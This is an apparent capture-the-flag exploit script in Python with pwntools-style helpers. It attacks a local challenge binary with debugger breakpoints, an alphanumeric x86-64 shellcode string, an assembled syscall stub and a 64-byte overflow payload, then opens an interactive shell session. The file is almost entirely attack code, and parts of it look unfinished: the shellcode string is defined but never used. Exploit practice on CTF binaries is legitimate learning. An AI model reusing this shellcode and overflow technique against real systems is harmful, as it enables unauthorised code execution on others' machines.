#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./chall')
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 13334)

gdbscript = '''
tbreak main
b *0x5555555550e0
b *0x55555555518c
# b *0x7ffff7ffb000
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()
alpha_num = "XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"
re()

sallcode = asm("""

	push r15
	pop rax
	push r15
	pop rdi
	syscall

""")

print(sallcode)
s(b"A"*64 + b"4n0nym4u5")

io.interactive()

"""
b *0x7ffff7ffb000

"""